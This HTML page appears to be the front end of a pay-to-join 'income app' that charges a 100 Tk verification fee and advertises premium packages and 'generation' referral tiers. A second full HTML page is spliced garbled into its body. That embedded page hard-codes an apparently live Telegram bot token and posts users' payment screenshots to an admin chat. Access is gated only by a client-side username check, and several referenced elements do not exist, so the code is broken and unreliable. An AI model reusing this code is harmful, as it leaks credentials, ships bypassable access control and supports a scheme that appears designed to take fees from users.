<!DOCTYPE html>
<html>
<head>
<title>Income App Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial; background:#0f172a; color:white; text-align:center;}
button {padding:15px; margin:10px; width:80%; border:none; border-radius:10px; font-size:18px; background:#22c55e; color:white;}
input {margin:10px; padding:10px; width:80%;}
.menu-section {margin-top:30px; border-top:1px solid #555; padding-top:20px;}
.disabled {opacity:0.5; pointer-events:none;}
</style>
</head>
<body>

<h2>ğŸ’° Income App Dashboard</h2>

<!DOCTYPE html>
â€<html>
â€<head>
â€<meta name="viewport" content="width=device-width, initial-scale=1">
â€<title>Account Verify</title>
â€
â€<style>
â€body{font-family:sans-serif;background:#0f172a;color:#fff;text-align:center;padding:20px}
â€.box{background:#1e293b;padding:20px;border-radius:12px;max-width:400px;margin:auto}
â€input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none}
â€button{background:#22c55e;color:#000;font-weight:bold}
â€</style>
â€</head>
â€
â€<body>
â€
â€<div class="box">
â€
â€<h2>Account Verify â€” 100 Tk</h2>
â€
â€<p>Send money â†’ Upload Screenshot</p>
â€
â€<input id="name" placeholder="Your Name">
â€<input type="file" id="file">
â€
â€<button onclick="sendScreenshot()">Submit Screenshot</button>
â€
â€</div>
â€
â€<script>
â€const BOT_TOKEN = "8051092032:AAGSVOe8efxnJqnBhsM2wdOclA-qtf45V98";
â€const ADMIN_ID = "7832485327";
â€
â€async function sendScreenshot(){
â€
â€  const name = document.getElementById("name").value;
â€  const file = document.getElementById("file").files[0];
â€
â€  if(!file){ alert("Upload screenshot"); return; }
â€
â€  const tg = window.Telegram.WebApp;
â€  const userId = tg?.initDataUnsafe?.user?.id || "unknown";
â€
â€  const formData = new FormData();
â€
â€  formData.append("chat_id", ADMIN_ID);
â€  formData.append("photo", file);
â€
â€  formData.append("caption",
â€`ğŸ’° New Verify Request
â€
â€ğŸ‘¤ Name: ${name}
â€ğŸ†” User ID: ${userId}
â€
â€Approve or Reject:`);
â€
â€  formData.append("reply_markup", JSON.stringify({
â€    inline_keyboard: [
â€      [
â€        {text:"âœ… Approve", url:`https://t.me/YOUR_BOT_USERNAME?start=approve_${userId}`},
â€        {text:"âŒ Reject", url:`https://t.me/YOUR_BOT_USERNAME?start=reject_${userId}`}
â€      ]
â€    ]
â€  }));
â€
â€  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
â€    method:"POST",
â€    body:formData
â€  });
â€
â€  alert("Submitted â€” Waiting for approval");
â€}
â€</script>
â€
â€</body>
â€</html>

<!-- Menu -->
<div id="menu">
<div class="menu-section">
<button id="dashboardBtn" class="disabled">ğŸ“Š Dashboard</button>
<button id="profileBtn" class="disabled">ğŸ‘¤ Profile</button>
<button id="jobsBtn" class="disabled">ğŸ“‹ My Jobs & Proved</button>
<button id="premiumBtn" class="disabled">ğŸ’ Premium Package</button>
<button id="leadershipBtn" class="disabled">ğŸ§‘â€ğŸ’¼ Leadership</button>
<button id="generationBtn" class="disabled">ğŸŒ³ Generation</button>
<button id="walletBtn" class="disabled">ğŸ’° My Wallet</button>
<button id="withdrawBtn" class="disabled">ğŸ§ Withdraw</button>
<button id="transferBtn" class="disabled">ğŸ” Transfer Balance</button>
<button id="charityBtn" class="disabled">â¤ï¸ Help the Poor</button>
<button id="supportBtn">ğŸ“ Support</button>
</div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

<script>
// ğŸ”¹ Firebase Config
const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
  projectId: "YOUR_PROJECT_ID",
  storageBucket: "YOUR_PROJECT_ID.appspot.com",
  messagingSenderId: "SENDER_ID",
  appId: "APP_ID"
};

firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const db = firebase.firestore();

// ğŸ”¹ Telegram Username Input
let telegramUsername = prompt("Enter your Telegram username (e.g., @username)");

// ğŸ”¹ Check Account Status
db.collection('users').doc(telegramUsername).get().then(doc => {
  if(doc.exists && doc.data().accountStatus === "approved"){
    enableMenu();
  }
});

// ğŸ”¹ Enable Menu Function
function enableMenu(){
  const buttons = document.querySelectorAll("#menu button");
  buttons.forEach(btn => btn.classList.remove("disabled"));
  document.getElementById("account-verify").style.display = "none";
}

// ğŸ”¹ Upload Screenshot Function
function uploadScreenshot(){
  const file = document.getElementById('screenshotInput').files[0];
  if(!file){ alert('Please select screenshot'); return; }

  const uploadTask = storage.ref('payments/' + telegramUsername + '_' + file.name).put(file);

  uploadTask.on('state_changed', 
    snapshot => {},
    error => { console.error(error); },
    () => {
      uploadTask.snapshot.ref.getDownloadURL().then(url => {
        db.collection('users').doc(telegramUsername).set({
          screenshotURL: url,
          accountStatus: "pending",
          timestamp: firebase.firestore.FieldValue.serverTimestamp()
        }).then(() => {
          document.getElementById('status').innerText = 'Screenshot uploaded! Waiting for approval.';
        });
      });
    }
  );
}
</script>
</body>
</html>
